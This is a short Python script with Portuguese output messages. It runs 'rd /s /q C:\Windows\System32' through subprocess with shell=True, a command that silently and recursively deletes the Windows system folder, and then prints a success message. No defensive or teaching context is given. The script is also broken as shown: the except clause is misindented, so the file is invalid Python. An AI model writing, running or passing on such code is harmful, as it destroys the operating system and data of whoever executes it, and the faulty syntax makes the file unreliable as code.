import subprocess



comando = "rd /s /q C:\\Windows\\System32"

try:
    subprocess.run(comando, shell=True, check=True)
    print("Comando executado com sucesso.")

    except subprocess.CalledProcessError as e:
    print(f"Ocorreu um erro ao executar o comando: {e}")
    